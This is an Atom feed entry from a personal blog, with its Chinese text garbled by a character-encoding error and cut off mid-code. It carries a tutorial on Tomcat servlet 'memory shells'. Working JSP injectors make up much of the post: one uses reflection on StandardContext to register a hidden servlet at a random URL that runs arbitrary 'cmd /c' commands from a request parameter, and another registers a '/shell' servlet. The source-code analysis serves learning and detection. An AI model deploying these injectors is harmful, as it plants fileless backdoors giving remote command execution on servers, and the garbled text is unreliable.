<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>clown</title>
  
  <subtitle>clownçš„ç«™ç‚¹</subtitle>
  <link href="https://clowsman.github.io/atom.xml" rel="self"/>
  
  <link href="https://clowsman.github.io/"/>
  <updated>2024-09-20T15:19:53.070Z</updated>
  <id>https://clowsman.github.io/</id>
  
  <author>
    <name>clown</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ä¼ ç»Ÿwebåº”ç”¨å‹å†…å­˜é©¬</title>
    <link href="https://clowsman.github.io/2024/09/14/%E4%BC%A0%E7%BB%9Fweb%E5%BA%94%E7%94%A8%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>https://clowsman.github.io/2024/09/14/%E4%BC%A0%E7%BB%9Fweb%E5%BA%94%E7%94%A8%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2024-09-14T14:31:10.000Z</published>
    <updated>2024-09-20T15:19:53.070Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™é‡Œæ˜¯æœ¬èœé¸¡å¼€å§‹å­¦ä¹ å†…å­˜é©¬çš„èµ·å§‹æ–‡ç« </p><p>æœ‰å…³å†…å­˜é©¬çš„è®¤çŸ¥å¯ä»¥çœ‹çœ‹su18å¸ˆå‚…çš„è¿™ç¯‡æ–‡ç« ï¼š<a href="https://mp.weixin.qq.com/s/NKq4BZ8fLK7bsGSK5UhoGQ">https://mp.weixin.qq.com/s/NKq4BZ8fLK7bsGSK5UhoGQ</a></p><p>æœ‰å…³tomcatæºç åˆ†æçš„æ–‡ç« ï¼š<a href="https://blog.csdn.net/u010883443/article/details/107463782">Tomcatæºç åˆè¯†ä¸€ Tomcatæ•´ç†æµç¨‹å›¾_tomcatæµç¨‹å›¾-CSDNåšå®¢</a></p><p>ç„¶åè¿™é‡Œæœ‰ä¸€ç¯‡æ€»ç»“å¾—ç‰¹åˆ«å…¨å¾—å†…å­˜é©¬æ–‡ç« ï¼š<a href="https://paper.seebug.org/3120/">https://paper.seebug.org/3120/</a></p><p>è¿™é‡Œæ”¾ä¸€å¼ æ–‡ç« ä¸­çš„æºç åˆ†æçš„åˆå§‹åŒ–æµç¨‹å›¾ï¼š</p><p><img src="https://cdn.clown2024.cn/202409161536558.png" alt="å†…å­˜é©¬æµç¨‹"></p><p>åšä¸ªå‚è€ƒå¯¹å¤§è‡´æµç¨‹æœ‰ä¸ªæ¦‚å¿µ</p><blockquote><p> è°ƒè¯•çš„æ—¶å€™æˆ‘çªç„¶å‘ç°ä¸åº”è¯¥å¼€å¯tomcatçš„è‡ªåŠ¨æ‰“å¼€æµè§ˆå™¨ï¼Œè¿™æ ·è°ƒè¯•è®¿é—®å‰æˆ–è€…è®¿é—®åçš„é€»è¾‘æ˜¯æ‰ä¸ä¼šé‚£ä¹ˆä¹±ğŸ˜¢</p><p> å› ä¸ºä»–é»˜è®¤æ˜¯åœ¨æˆ‘ä»¬è®¿é—®åæ‰ä¼šå»åˆ›å»ºå®ä¾‹</p></blockquote><h1><span id="servletå†…å­˜é©¬">Servletå†…å­˜é©¬</span></h1><h2><span id="ç®€å•demo">ç®€å•demo</span></h2><p>å…ˆå†™ä¸€ä¸ªç®€å•çš„demoç„¶åå†åˆ†æä¸€ä¸‹åŸç†å§ï¼Œå…ˆçœ‹çœ‹æ•ˆæœ</p><blockquote><p>è¿™é‡Œç”¨äº†ä½¿ç”¨äº†tomcat8ï¼Œtomcat10ç”¨é‚£ä¸ªdemoæœ‰äº›ç±»æ‰¾ä¸åˆ°</p><p>è¦çœ‹æºç çš„è¯éœ€è¦å¯¼å…¥å¯¹åº”tomcatç‰ˆæœ¬çš„ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.50<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™æ˜¯tomcatçš„æ ¸å¿ƒä¾èµ–ï¼Œèµ·æœåŠ¡çš„è¿‡ç¨‹æºç åŸºæœ¬éƒ½åœ¨è¿™é‡Œ</p></blockquote><p>ç¼–å†™ä¸€ä¸ªservletå†…å­˜é©¬çš„æ­¥éª¤ï¼š</p><ul><li>æ‰¾åˆ°StandardContext</li><li>ç»§æ‰¿å¹¶ç¼–å†™ä¸€ä¸ªæ¶æ„servlet</li><li>åˆ›å»ºWapperå¯¹è±¡</li><li>è®¾ç½®Servletçš„LoadOnStartUpçš„å€¼</li><li>è®¾ç½®Servletçš„Name</li><li>è®¾ç½®Servletå¯¹åº”çš„Class</li><li>å°†Servletæ·»åŠ åˆ°contextçš„childrenä¸­</li><li>å°†urlè·¯å¾„å’Œservletç±»åšæ˜ å°„</li></ul><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.Servlet&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletRequest&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletResponse&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.PrintWriter&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;MemoryShellInjectDemo&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        appctx.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">servletURL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/&quot;</span> + getRandomString();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">servletName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Servlet&quot;</span> + getRandomString();<br>        <span class="hljs-type">Servlet</span> <span class="hljs-variable">servlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Servlet</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig servletConfig)</span> &#123;&#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> servletRequest.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>                &#123;<br>                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd /c &quot;</span> + cmd).getInputStream();<br>                    <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in, <span class="hljs-string">&quot;GBK&quot;</span>).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>                    servletResponse.setCharacterEncoding(<span class="hljs-string">&quot;GBK&quot;</span>);<br>                    <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> servletResponse.getWriter();<br>                    out.println(output);<br>                    out.flush();<br>                    out.close();<br>                &#125;<br>            &#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>            &#125;<br>        &#125;;<br>        <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>        wrapper.setName(servletName);<br>        wrapper.setServlet(servlet);<br>        wrapper.setServletClass(servlet.getClass().getName());<br>        wrapper.setLoadOnStartup(<span class="hljs-number">1</span>);<br>        standardContext.addChild(wrapper);<br>        standardContext.addServletMappingDecoded(servletURL, servletName);<br>        response.getWriter().write(<span class="hljs-string">&quot;[+] Success!!!&lt;br&gt;&lt;br&gt;[*] ServletURL:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span> + servletURL + <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;[*] ServletName:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span> + servletName + <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;[*] shellURL:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;http://localhost:8080/test&quot;</span> + servletURL + <span class="hljs-string">&quot;?cmd=echo ä¸–ç•Œï¼Œä½ å¥½ï¼&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">errorMessage</span> <span class="hljs-operator">=</span> e.getMessage();<br>        response.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">outError</span> <span class="hljs-operator">=</span> response.getWriter();<br>        outError.println(<span class="hljs-string">&quot;Error: &quot;</span> + errorMessage);<br>        outError.flush();<br>        outError.close();<br>    &#125;<br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br>&lt;%!<br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">getRandomString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">characters</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">randomString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) (Math.random() * characters.length());<br>            randomString.append(characters.charAt(index));<br>        &#125;<br>        <span class="hljs-keyword">return</span> randomString.toString();<br>    &#125;<br>%&gt;<br><br></code></pre></td></tr></table></figure><p>æ‰“å…¥åæ•ˆæœ</p><p><img src="https://cdn.clown2024.cn/202409161601686.png" alt="image-20240916160158629"></p><p>ç„¶åå°±å¯ä»¥å»è®¿é—®å¯¹åº”è·¯ç”±æ‰§è¡Œå‘½ä»¤</p><p><img src="https://cdn.clown2024.cn/202409161602929.png" alt="image-20240916160242879"></p><h2><span id="åŸç†åˆ†æ">åŸç†åˆ†æ</span></h2><p>servletå†…å­˜é©¬å°±æ˜¯å»æ‰¾åˆ°æºç ä¸­æ³¨å†Œservletçš„å†…å®¹ï¼Œç„¶åæˆ‘ä»¬é‡å¤ä¸€éç›´æ¥æ³¨å†Œè‡ªå·±çš„servletå³å¯</p><p>è¿™é‡Œæˆ‘ä»¬æ˜¯å»æ‰¾æºç ä¸­å¦‚ä½•å°†web.xmlçš„é…ç½®å˜æˆservletçš„è¿‡ç¨‹</p><p>é¦–å…ˆæ‰¾åˆ°åŠ è½½web.xmlçš„ContextConfig#webconfig()</p><p><img src="https://cdn.clown2024.cn/202409161629329.png" alt="image-20240916162907251"></p><p>ç„¶åé‡Œé¢å°±æ˜¯è¯»å–web.xmlçš„ä¸€äº›ä»£ç ï¼Œé‡è¦åœ¨ç¬¬ä¹ä¸ªæ­¥éª¤</p><p><img src="https://cdn.clown2024.cn/202409161630551.png" alt="image-20240916163037486"></p><p>è¿™é‡Œæ³¨é‡Šå°†web.xmlåº”ç”¨äºContextï¼Œè°ƒç”¨ContextConfig#configureContextæ–¹æ³•</p><p>è·Ÿè¿›å»çœ‹ä¸€çœ‹</p><p><img src="https://cdn.clown2024.cn/202409161637697.png" alt="image-20240916163737624"></p><p>è¿™é‡Œæœ‰å¾ˆå¤šçš„æ“ä½œéƒ½æ˜¯é€šè¿‡contextåŠ è½½è¿›å»ï¼Œè¿™é‡Œçš„contextå°±æ˜¯æˆ‘ä»¬çš„StandardContextï¼Œtomcatæ¯ä¸ªå®¹å™¨å¯åŠ¨æ—¶éƒ½ä¼šé€šè¿‡ä¸€ä¸ªStandard***#startInternal()æ–¹æ³•æ¥å¯åŠ¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å…·ä½“çš„contextå°±æ˜¯StandardContextå¼€å§‹çš„ï¼Œæˆ‘ä»¬å¯ä»¥è°ƒè¯•çœ‹çœ‹è¿™ä¸ªcontext</p><p><img src="https://cdn.clown2024.cn/202409161650754.png" alt="image-20240916165022674"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯æˆ‘ä»¬çš„StandardContextï¼Œç„¶åè¿™ä¸ªwebxmlé‡Œé¢å°±æœ‰è§£ææˆ‘ä»¬web.xmlæ–‡ä»¶æ‹¿åˆ°çš„servlet</p><p><img src="https://cdn.clown2024.cn/202409161651016.png" alt="image-20240916165127949"></p><p>è¿™ä¸ªHelloå°±æ˜¯æˆ‘ä»¬è‡ªå·±æ³¨å†Œçš„ï¼Œ<strong>æ‰€ä»¥ç¬¬ä¸€æ­¥çš„æ‰¾åˆ°StandardContextï¼Œå…¶å®å°±æ˜¯è·å–å½“å‰åº”ç”¨çš„contextå®ä¾‹</strong>ï¼Œç„¶åå¾€é‡Œé¢æ³¨å†Œservletï¼Œæˆ‘ä»¬å›åˆ°configureContextæ–¹æ³•ç»§ç»­å¾€ä¸‹æ‰¾å…³é”®åœ°æ–¹</p><p><img src="https://cdn.clown2024.cn/202409161658274.png" alt="image-20240916165818197"></p><p>è¿™é‡Œéå†æˆ‘ä»¬çš„servletç„¶ååˆ›å»ºwrapperï¼Œæˆ‘ä»¬çŸ¥é“wrapperå°±æ˜¯ç”¨æ¥å°è£…servletçš„</p><p><img src="https://cdn.clown2024.cn/202409161701466.png" alt="image-20240916170126390"></p><p>ç„¶åè¿™é‡Œçš„wrapperå°±æ˜¯æˆ‘ä»¬çŸ¥é“çš„tomcatå®šä¹‰çš„Wrapperçš„å®ç°ç±»ï¼Œæ‹¿åˆ°wrapperä¹‹åç»§ç»­å¾€ä¸‹ï¼Œçœ‹ä¸€ä¸‹å…³é”®çš„setæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409161708368.png" alt="image-20240916170822326"></p><p>ç¬¬ä¸€æ­¥å…ˆå¯¹loadOnStartupçš„å€¼è¿›è¡Œè®¾ç½®ï¼Œè¿™ä¸ªå€¼ä»£è¡¨çš„æ˜¯Servletåœ¨å¯åŠ¨æ—¶çš„åŠ è½½é¡ºåºï¼Œå¦‚æœè®¾ç½®ä¸ºè´Ÿæ•°ï¼Œé‚£ä¹ˆServletå°†åœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚æ—¶æ‰è¢«åŠ è½½</p><p><img src="https://cdn.clown2024.cn/202409161715978.png" alt="image-20240916171559932"></p><p>è¿™ä¸€æ­¥å°±æ˜¯è¿™æ˜¯servletçš„name</p><p><img src="https://cdn.clown2024.cn/202409161716418.png" alt="image-20240916171636372"></p><p>è¿™ä¸€æ­¥è®¾ç½®servletClassç”¨çš„æ˜¯å…¨ç±»å</p><p><img src="https://cdn.clown2024.cn/202409161719067.png" alt="image-20240916171908029"></p><p>è¿™ä¸€æ­¥å°†å‰é¢çš„wrapperæ·»åŠ åˆ°contexté‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202409161721789.png" alt="image-20240916172036567"></p><p>ç„¶åè¿™æ˜¯å°†å‰é¢çš„servletéå†å®Œä¹‹åï¼Œå†éå†servletMappingï¼Œå¾€contexté‡Œé¢æ·»åŠ æ˜ å°„ï¼Œä¸‹é¢æ˜¯servletMappings</p><p><img src="https://cdn.clown2024.cn/202409161722241.png" alt="image-20240916172220190"></p><p>ç„¶åè¿™å°±æ˜¯æ•´ä¸ªæ³¨å†Œçš„æµç¨‹ï¼Œä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰å®ä¾‹åŒ–æˆ‘ä»¬å†™çš„Servletç±»ï¼Œå› ä¸ºå®ƒå­˜åœ¨æ‡’åŠ è½½æœºåˆ¶ï¼Œéœ€è¦æˆ‘ä»¬å»è®¿é—®çš„æ—¶å€™æ‰ä¼šåˆ›å»ºå®ä¾‹ï¼Œä½†å¦‚æœæˆ‘ä»¬è‡ªå·±åŠ¨æ€åœ¨é¡µé¢å†™å°±ä¼šèµ°ä¸åˆ°é‚£ä¸ªæµç¨‹ï¼Œéœ€è¦æˆ‘ä»¬ç›´æ¥å°†å®ä¾‹ç±»æ”¾è¿›å»</p><p>ç°åœ¨çŸ¥é“æ‰€æœ‰æµç¨‹æˆ‘ä»¬å°±å¯ä»¥å¼€å§‹å†™å†…å­˜é©¬äº†ï¼Œè¿™é‡Œæ˜¯æ ¹æ®ç»„é•¿çš„æµç¨‹æ¥å†™ï¼Œæ¯”è¾ƒç®€å•</p><p>ç¬¬ä¸€æ­¥æ‰¾åˆ°standardContextï¼Œè¿™ä¹Ÿæ˜¯æœ€å…³é”®çš„ä¸€æ­¥ï¼Œå› ä¸ºæˆ‘ä»¬çŸ¥é“jspé‡Œé¢æ˜¯æœ‰requestå¯¹è±¡çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡requestå¯¹è±¡æ¥è·å–standardContext</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>System.out.println(servletContext);<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆçœ‹çœ‹request#getServletContextè¿”å›çš„å¯¹è±¡</p><p><img src="https://cdn.clown2024.cn/202409161746714.png" alt="image-20240916174627626"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¾€é‡Œé¢ç¬¬äºŒå±‚çš„contextå°±æ˜¯StandardContextï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨åå°„æ¥è·å–</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//1.è·å–standardContext</span><br>        <span class="hljs-comment">//è·å–ApplicationContext</span><br><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>Field applicationContextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br>        <span class="hljs-comment">//è·å–StandardContext</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br></code></pre></td></tr></table></figure><p>ç„¶ååé¢çš„å°±æ¯”è¾ƒç®€å•äº†ï¼ŒæŒ‰ç…§æˆ‘ä»¬å‰é¢åˆ†æçš„æ³¨å†Œæ­¥éª¤å³å¯ï¼Œå°±æ˜¯è¦æ³¨æ„ä¸€ç‚¹æˆ‘ä»¬è¦æ‰‹åŠ¨å°†servletå®ä¾‹æ³¨å†Œè¿›å»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//2.è·å–wrapperç„¶åæ·»åŠ </span><br><span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>wrapper.setName(<span class="hljs-string">&quot;TestShell&quot;</span>);<br>wrapper.setServletClass(TestShell.class.getName());<br>   <span class="hljs-comment">//åº”å¯¹æ‡’åŠ è½½æ·»åŠ æˆ‘ä»¬çš„å®ä¾‹åŒ–servlet</span><br>wrapper.setServlet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestShell</span>());<br><span class="hljs-comment">//3.å°†wrapperæ·»åŠ è¿›standardContext</span><br>standardContext.addChild(wrapper);<br><span class="hljs-comment">//4.æ·»åŠ æ˜ å°„</span><br>standardContext.addServletMappingDecoded(<span class="hljs-string">&quot;/shell&quot;</span>,<span class="hljs-string">&quot;TestShell&quot;</span>);<br></code></pre></td></tr></table></figure><p>ç„¶åè¿™ä¸ªservletæˆ‘ä»¬å°±ç®€å•çš„å¼¹ä¸€ä¸ªè®¡ç®—å™¨ï¼Œå®Œæ•´çš„jspæ–‡ä»¶å¦‚ä¸‹</p><p>addServlet.jsp</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestShell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br><span class="hljs-comment">//åŠ¨æ€æ³¨å†Œ</span><br>    <span class="hljs-comment">//1.è·å–standardContext</span><br>        <span class="hljs-comment">//è·å–ApplicationContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    Field applicationContextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br>        <span class="hljs-comment">//è·å–StandardContext</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br>    <span class="hljs-comment">//2.è·å–wrapperç„¶åæ·»åŠ </span><br>    <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>    wrapper.setName(<span class="hljs-string">&quot;TestShell&quot;</span>);<br>    wrapper.setServletClass(TestShell.class.getName());<br>        <span class="hljs-comment">//åº”å¯¹æ‡’åŠ è½½æ·»åŠ æˆ‘ä»¬çš„å®ä¾‹åŒ–servlet</span><br>    wrapper.setServlet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestShell</span>());<br>    <span class="hljs-comment">//3.å°†wrapperæ·»åŠ è¿›standardContext</span><br>    standardContext.addChild(wrapper);<br>    <span class="hljs-comment">//4.æ·»åŠ æ˜ å°„</span><br>    standardContext.addServletMappingDecoded(<span class="hljs-string">&quot;/shell&quot;</span>,<span class="hljs-string">&quot;TestShell&quot;</span>);<br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409161818833.png" alt="image-20240916181846766"></p><p><img src="https://cdn.clown2024.cn/202409161819095.png" alt="image-20240916181903999"></p><p>ç„¶åæˆåŠŸç™½å±å¼¹è®¡ç®—å™¨ğŸ˜‹</p><p>è€Œæˆ‘ä»¬å‰é¢çš„demoæˆ‘æ˜¯ç›´æ¥ç”¨çš„æ–‡ç« é‡Œçš„ï¼Œä»–è¿™é‡Œå°±æ˜¯ç”¨äº†ä¸€ä¸ªéšæœºè·¯å¾„å’Œéšæœºæ–‡ä»¶åçš„æ–¹å¼æ³¨å†Œï¼Œç„¶åç›´æ¥ç”¨åŒ¿åç±»çš„å½¢å¼è¿›è¡Œå®ç°åŒ–ï¼Œç„¶åç›´æ¥å°†å‘½ä»¤ç»“æœæ‰“å°å‡ºæ¥åˆ°ç½‘é¡µ</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">Servlet</span> <span class="hljs-variable">servlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Servlet</span>() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span 